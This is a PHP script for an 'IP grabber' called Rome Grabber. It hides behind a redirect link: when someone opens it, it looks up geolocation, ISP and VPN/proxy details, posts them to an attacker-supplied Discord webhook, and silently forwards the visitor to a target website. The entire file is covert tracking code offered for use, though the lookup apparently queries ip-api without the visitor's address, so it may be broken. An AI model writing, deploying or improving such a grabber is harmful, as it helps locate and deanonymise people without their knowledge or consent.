<?php
const WEBHOOK_DEFAULT = "https://discordapp.com/api/webhooks/";
const ROME_GRABBER_LOGO = "https://i.ibb.co/sq2yKzt/rome-grabber-logo.png";
const IP_API_FIELDS = "26436603";

$webhook_id = base64_decode($_GET["id"]);
$target_website = base64_decode($_GET["target"]);

if ($webhook_id && $target_website) {
    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/?fields=" . IP_API_FIELDS));
    $current_time = date("m/d/Y g:i A", time());
    $payload = null;

    if ($ip_details->status == "success") {
        $discord_country_flag = ":flag_" . strtolower($ip_details->countryCode) . ":";
        $mobile = $ip_details->mobile ? "Yes" : "No";
        $proxy = $ip_details->proxy ? "Yes" : "No";
        $hosting = $ip_details->hosting ? "Yes" : "No";

        $payload = json_encode(array(
            "username" => "RomeG Bot",
            "avatar_url" => ROME_GRABBER_LOGO,
            "embeds" => array(
                array(
                    "title" => "<---- [ :bow_and_arrow: IP Address Captured ] ---->",
                    "description" => "
                    **:satellite: Information** ($discord_country_flag $ip_details->query)
```IP: $ip_details->query
Continent: $ip_details->continent
Country: $ip_details->country
Region/state: $ip_details->regionName
City: $ip_details->city
Zip code: $ip_details->zip
Geolocation: lat: $ip_details->lat / lon: $ip_details->lon
Timezone: $ip_details->timezone
National currency: $ip_details->currency
ISP: $ip_details->isp
Mobile connection: $mobile
Proxy/VPN/Tor: $proxy
Hosting: $hosting```",
                    "color" => hexdec("#daa520"),
                    "thumbnail" => array(
                        "url" => ROME_GRABBER_LOGO
                    ),
                    "footer" => array(
                        "text" => $current_time
                    )
                )
            )
        ));
    } else {
        $payload = json_encode(array(
            "username" => "RomeG Bot",
            "avatar_url" => ROME_GRABBER_LOGO,
            "embeds" => array(
                array(
                    "title" => "<xxxx [ Error ] xxxx>",
                    "description" => "An error occurred while trying to identify the IP!",
                    "color" => hexdec("#dc2626"),
                    "thumbnail" => array(
                        "url" => ROME_GRABBER_LOGO
                    ),
                    "footer" => array(
                        "text" => $current_time
                    )
                )
            )
        ));
    }

    $ch = curl_init(WEBHOOK_DEFAULT . $webhook_id);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
    curl_exec($ch);
    curl_close($ch);

    header("Location: $target_website");
} else {
    header("Location: index.php");
}
